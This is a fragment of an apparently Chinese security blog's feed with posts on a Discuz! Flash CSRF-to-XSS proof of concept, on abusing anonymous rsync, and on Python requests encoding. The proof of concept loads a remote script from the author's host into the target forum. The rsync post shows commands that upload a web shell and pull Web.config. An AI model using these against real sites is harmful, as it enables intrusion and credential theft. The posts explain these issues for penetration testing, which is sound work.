class=&quot;line&quot;&gt;&amp;lt;head&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;lt;title&amp;gt;FlashCSRF POC&amp;lt;/title&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/head&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;body&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;lt;h1&amp;gt;Hacked by Chu&amp;lt;/h1&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;lt;object classid=&amp;quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&amp;quot; codebase=&amp;quot;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0&amp;quot; width=&amp;quot;500&amp;quot; height=&amp;quot;500&amp;quot; id=&amp;quot;FlashVars&amp;quot; align=&amp;quot;middle&amp;quot;/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;lt;paramname=&amp;quot;allowScriptAccess&amp;quot; value=&amp;quot;always&amp;quot;/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;lt;paramname=&amp;quot;movie&amp;quot; value=&amp;quot;http://localhost/discuz.swf&amp;quot; /&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;lt;paramname=&amp;quot;FlashVars&amp;quot; value=&amp;quot;url=http://localhost/dz3/&amp;amp;src=http://sh3ll.me/1.js&amp;quot;/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;lt;paramname=&amp;quot;quality&amp;quot; value=&amp;quot;high&amp;quot; /&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;lt;embed src=&amp;quot;http://localhost/discuz.swf&amp;quot; quality=&amp;quot;high&amp;quot; bgcolor=&amp;quot;#ffffff&amp;quot; width=&amp;quot;500&amp;quot; height=&amp;quot;500&amp;quot; name=&amp;quot;FlashVars&amp;quot; align=&amp;quot;middle&amp;quot; allowScriptAccess=&amp;quot;always&amp;quot; FlashVars=&amp;quot;url=http://localhost/dz3/&amp;amp;src=http://sh3ll.me/1.js&amp;quot; type=&amp;quot;application/x-shockwave-flash&amp;quot; pluginspage=&amp;quot;http://www.macromedia.com/go/getflashplayer&amp;quot;/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;lt;/object/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/body&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/html&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后，只要我们把这两个文件放在https服务器上，诱使目标访问即可，为了演示攻击效果，我做了个 gif 图片（图片有点大，耐心等待 :D）：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/2014/07/02/discuz-flash-csrf-to-xss.gif&quot; alt=&quot;攻击效果&quot;&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;Discuz! 的crossdomain.xml 一直是个大问题，默认的crossdomain.xml如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;cross-domain-policy&amp;gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;lt;allow-access-from domain=&amp;quot;*&amp;quot; /&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/cross-domain-policy&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里，allow-access-from domain被设置成了 * ，意味着任意站点的 flash 文件都可以对 dz 站点发起 http 请求。
    
    </summary>
    
      <category term="Pentest" scheme="http://sh3ll.me/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>rsync 匿名访问</title>
    <link href="http://sh3ll.me/2014/06/26/rsync-anonymous-access/"/>
    <id>http://sh3ll.me/2014/06/26/rsync-anonymous-access/</id>
    <published>2014-06-26T14:12:36.000Z</published>
    <updated>2016-07-16T09:12:50.038Z</updated>
    
    <content type="html">&lt;p&gt;最近看wooyun hot bugs，关注到这个问题，感觉引起的危害还是比较大的，而且很多管理员也没有注意到。&lt;/p&gt;
&lt;p&gt;基本语句：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;rsync X.X.X.X::                                             //列模块&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;rsync /tmp/shell.php X.X.X.X::web/                          //写文件&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;rsync -avz X.X.X.X::web/Web.config /tmp/Web.config          //下载文件&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;```&amp;lt;!--more--&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;有用的脚本：&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;/usr/local/share/nmap/scripts/rsync-brute.nse               //暴力破解密码&lt;br&gt;/usr/local/share/nmap/scripts/rsync-list-modules.nse        //列模块&lt;br&gt;```&lt;/p&gt;
&lt;p&gt;实例就不来了，zmap扫描下端口，很多的。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;最近看wooyun hot bugs，关注到这个问题，感觉引起的危害还是比较大的，而且很多管理员也没有注意到。&lt;/p&gt;
&lt;p&gt;基本语句：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;p
    
    </summary>
    
      <category term="Pentest" scheme="http://sh3ll.me/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Python + Requests 编码问题</title>
    <link href="http://sh3ll.me/2014/06/18/python-requests-encoding/"/>
    <id>http://sh3ll.me/2014/06/18/python-requests-encoding/</id>
    <published>2014-06-18T14:17:29.000Z</published>
    <updated>2016-07-16T09:12:50.038Z</updated>
    
    <content type="html">&lt;p&gt;requests 是一款非常人性化的 python http 库，但起对网页的编码识别却一直很蛋疼，时常出现乱码。&lt;/p&gt;
&lt;p&gt;可以从官方的 API 文档中找出乱码的根本原因，&lt;a href=&quot;http://docs.python-requests.org/en/latest/api/#requests.Response.text&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://docs.python-requests.org/en/latest/api/#requests.Response.text&lt;/a&gt;：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;class requests.Response&lt;br&gt;The Response object, which contains a server’s response to an HTTP request.&lt;/p&gt;
&lt;p&gt;···SNIP···&lt;/p&gt;
&lt;p&gt;text&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;Content of the response, in unicode.&lt;/p&gt;
&lt;p&gt;If Response.encoding is None, encoding will be guessed using chardet.&lt;/p&gt;
&lt;p&gt;The encoding of the response content is determined based solely on HTTP head&lt;br&gt;ers, following RFC 2616 to the letter. If you can take advantage of non-HTTP&lt;br&gt;knowledge to make a better guess at the encoding, you should set r.encoding&lt;br&gt;appropriately before accessing this property.&lt;/p&gt;
&lt;p&gt;···SNIP···&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;可见，requests 是通过 http header 猜测页面编码，如果 header 中不存在 charset 就认为编码为 ISO-8859-1。这样的话，对于返回头中没有指定页面编码的情况，自然就出现乱码了，如：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; import requests&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; r = requests.get(&amp;quot;http://www.wooyun.org&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; r.close()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; r.headers&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;CaseInsensitiveDict(&amp;#123;&amp;apos;via&amp;apos;: &amp;apos;10.67.15.68&amp;apos;, &amp;apos;content-encoding&amp;apos;: &amp;apos;gzip&amp;apos;, &amp;apos;transfer&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-encoding&amp;apos;: &amp;apos;chunked&amp;apos;, &amp;apos;set-cookie&amp;apos;: &amp;apos;saeut=123.138.79.30.1403078425607937; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;path=/; max-age=311040000, PHPSESSID=ead28aadbfdaa8aa3cc2d7c9bf184f67; path=/; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;HttpOnly&amp;apos;, &amp;apos;expires&amp;apos;: &amp;apos;Thu, 19 Nov 1981 08:52:00 GMT&amp;apos;, &amp;apos;server&amp;apos;: &amp;apos;nginx/1.4.4&amp;apos;, &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;apos;connection&amp;apos;: &amp;apos;keep-alive&amp;apos;, &amp;apos;pragma&amp;apos;: &amp;apos;no-cache&amp;apos;, &amp;apos;cache-control&amp;apos;: &amp;apos;no-store, &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;no-cache, must-revalidate, post-check=0, pre-check=0&amp;apos;, &amp;apos;date&amp;apos;: &amp;apos;Wed, 18 Jun 2014&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;08:00:25 GMT&amp;apos;, &amp;apos;x-powered-by&amp;apos;: &amp;apos;PHP/5.3.27&amp;apos;, &amp;apos;content-type&amp;apos;: &amp;apos;text/html&amp;apos;&amp;#125;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; r.encoding&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;apos;ISO-8859-1&amp;apos;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; print r.text&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;···SNIP···&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;lt;span class=&amp;quot;other fright&amp;quot;&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;lt;a href=&amp;quot;/impression&amp;quot;&amp;gt;è¡~Lä¸~Zè§~Bç~B¹&amp;lt;/a&amp;gt;                  //乱码了&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            Â· &amp;lt;a href=&amp;quot;/lawer&amp;quot;&amp;gt;æ³~Uå¾~Ké¡¾é~W®&amp;lt;/a&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            Â· &amp;lt;a href=&amp;quot;/contactus&amp;quot;&amp;gt;è~A~Tç³»æ~H~Qä»¬&amp;lt;/a&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            Â· &amp;lt;a href=&amp;quot;/help&amp;quot;&amp;gt;å¸®å~J©&amp;lt;/a&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            Â· &amp;lt;a href=&amp;quot;/about&amp;quot;&amp;gt;å~E³äº~N&amp;lt;/a&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;lt;/span&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;lt;/div&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;···SNIP···&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;文档中提供的解决办法：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If you can take advantage of non-HTTP knowledge to make a better guess at the encoding, you should set r.encoding appropriately before accessing this property.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;即在访问 r.text 属性前先设置下正确的编码，如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; import requests&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; r = requests.get(&amp;quot;http://www.wooyun.org&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; r.close()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; r.headers&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;CaseInsensitiveDict(&amp;#123;&amp;apos;via&amp;apos;: &amp;apos;10.67.15.68&amp;apos;, &amp;apos;content-encoding&amp;apos;: &amp;apos;gzip&amp;apos;, &amp;apos;transfer&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-encoding&amp;apos;: &amp;apos;chunked&amp;apos;, &amp;apos;set-cookie&amp;apos;: &amp;apos;saeut=123.138.79.30.1403078425607937; path&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;=/; max-age=311040000, PHPSESSID=ead28aadbfdaa8aa3cc2d7c9bf184f67; path=/; Http&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Only&amp;apos;, &amp;apos;expires&amp;apos;: &amp;apos;Thu, 19 Nov 1981 08:52:00 GMT&amp;apos;, &amp;apos;server&amp;apos;: &amp;apos;nginx/1.4.4&amp;apos;, &amp;apos;con&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;nection&amp;apos;: &amp;apos;keep-alive&amp;apos;, &amp;apos;pragma&amp;apos;: &amp;apos;no-cache&amp;apos;, &amp;apos;cache-control&amp;apos;: &amp;apos;no-store, no-cac&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;he, must-revalidate, post-check=0, pre-check=0&amp;apos;, &amp;apos;date&amp;apos;: &amp;apos;Wed, 18 Jun 2014 08:00&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;:25 GMT&amp;apos;, &amp;apos;x-powered-by&amp;apos;: &amp;apos;PHP/5.3.27&amp;apos;, &amp;apos;content-type&amp;apos;: &amp;apos;text/html&amp;apos;&amp;#125;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; r.encoding = &amp;quot;utf-8&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; print r.text&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;···SNIP···&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;lt;span class=&amp;quot;other fright&amp;quot;&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;lt;a href=&amp;quot;/impression&amp;quot;&amp;gt;行业观点&amp;lt;/a&amp;gt;              //正常了&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            · &amp;lt;a href=&amp;quot;/lawer&amp;quot;&amp;gt;法律顾问&amp;lt;/a&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            · &amp;lt;a href=&amp;quot;/contactus&amp;quot;&amp;gt;联系我们&amp;lt;/a&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            · &amp;lt;a href=&amp;quot;/help&amp;quot;&amp;gt;帮助&amp;lt;/a&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            · &amp;lt;a href=&amp;quot;/about&amp;quot;&amp;gt;关于&amp;lt;/a&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;lt;/span&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;lt;/div&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;···SNIP···&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;requests 也可以从内容获取编码，通过 chardet 库，只是默认没有启用:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; r = requests.get(&amp;quot;http://www.wooyun.org&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; r.close()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; r.encoding&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;apos;ISO-8859-1&amp;apos;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; r.apparent_encoding&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;apos;utf-8&amp;apos;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这样一来，我们可以直接通过设置 r.encoding 为 r.apparent_encoding，来解决这个「bug」:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; r = requests.get(&amp;quot;http://www.wooyun.org&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; r.close()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; r.encoding&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;apos;ISO-8859-1&amp;apos;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; r.apparent_encoding&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;apos;utf-8&amp;apos;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; r.encoding =  r.apparent_encoding&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt; print r.text&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;···SNIP···&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;lt;span class=&amp;quot;other fright&amp;quot;&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;lt;a href=&amp;quot;/impression&amp;quot;&amp;gt;行业观点&amp;lt;/a&amp;gt;              //正常了&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            · &amp;lt;a href=&amp;quot;/lawer&amp;quot;&amp;gt;法律顾问&amp;lt;/a&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            · &amp;lt;a href=&amp;quot;/contactus&amp;quot;&amp;gt;联系我们&amp;lt;/a&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            · &amp;lt;a href=&amp;quot;/help&amp;quot;&amp;gt;帮助&amp;lt;/a&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            · &amp;lt;a href=&amp;quot;/about&amp;quot;&amp;gt;关于&amp;lt;/a&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;lt;/span&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;lt;/div&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;···SNIP···&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;问题解决。&lt;/p&gt;
&lt;p&gt;References：&lt;br&gt;&lt;a href=&quot;http://liguangming.com/python-requests-ge-encoding-from-headers&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://liguangming.com/python-requests-ge-encoding-from-headers&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;requests 是一款非常人性化的 python http 库，但起对网页的编码识别却一直很蛋疼，时常出现乱码。&lt;/p&gt;
&lt;p&gt;可以从官方的 API 文档中找出乱码的根本原因，&lt;a href=&quot;http://docs.python-requests.org/en/latest/api/#requests.Response.text&quot;&gt;http://docs.python-requests.org/en/latest/api/#requests.Response.text&lt;/a&gt;：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;class requests.Response&lt;br&gt;The Response object, which contains a server’s response to an HTTP request.&lt;/p&gt;
&lt;p&gt;···SNIP···&lt;/p&gt;
&lt;p&gt;text
    
    </summary>
    
      <category term="Program" scheme="http://sh3ll.me/categories/Program/"/>
    
    
  </entry>
  
  <entry>
    <title>也来聊聊 Flash CSRF</title>
    <link href="http://sh3ll.me/2014/05/28/something-about-flash-csrf/"/>
    <id>http://sh3ll.me/2014/05/28/something-about-flash-csrf/</id>
    <published>2014-05-28T14:31:06.000Z</published>
    <updated>2016-07-16T09:12:50.038Z</updated>
    
    <content type="html">&lt;p&gt;update 2014/06/04&lt;br&gt;这篇文章里面的技巧非常 Nice~&lt;br&gt;&lt;a href=&quot;http://blog.detectify.com/post/86298380233/the-pitfalls-of-allowing-file-uploads-on-your-website&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.detectify.com/post/86298380233/the-pitfalls-of-allowing-file-uploads-on-your-website&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;看到 ping0s 在 FB 上放出了关于 Flash CSRF 的一些东西，也来聊一聊，just share.&lt;/p&gt;
&lt;p&gt;Flash CSRF 通常是由于 crossdomain.xml 配置不当造成的，利用方法是使用 swf 文件跨域发起请求。当 crossdomain.xml 配置得当时，我们也可以从目标站点发起伪造请求。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
